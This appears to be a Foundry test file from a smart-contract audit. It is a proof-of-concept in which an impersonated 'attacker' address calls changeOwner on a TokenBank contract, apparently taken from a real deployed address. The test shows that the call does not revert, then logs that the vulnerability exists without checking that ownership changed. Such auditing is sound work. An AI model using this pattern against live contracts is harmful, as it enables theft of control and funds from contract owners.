// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol";

contract OwnerChangeTest is Test {
    TokenBank public tokenBank;
    address public owner = address(0x123);
    address public attacker = address(0x456);
    address public newOwnerAddr = address(0x789);

    function setUp() public {
        vm.startPrank(owner);
        tokenBank = new TokenBank(); // Deploys with owner set
        vm.stopPrank();
    }

    function test_nonOwnerCanChangeOwnerWithoutRevert() public {
        console.log("--- BEFORE-Trigger owner change ---");
        console.log("No observable state variables to validate");
        
        console.log("--- Trigger ChangeOwner ---");
        // Attempt changeOwner call by non-owner
        vm.startPrank(attacker);
        tokenBank.changeOwner(newOwnerAddr);
        vm.stopPrank();
        console.log("Transaction executed without revert");
        
        console.log("--- AFTER-Trigger owner change ---");
        console.log("No observable state variables to validate");
        
        console.log("Vulnerability Exists: non-owner successfully executed owner change without revert");
    }
}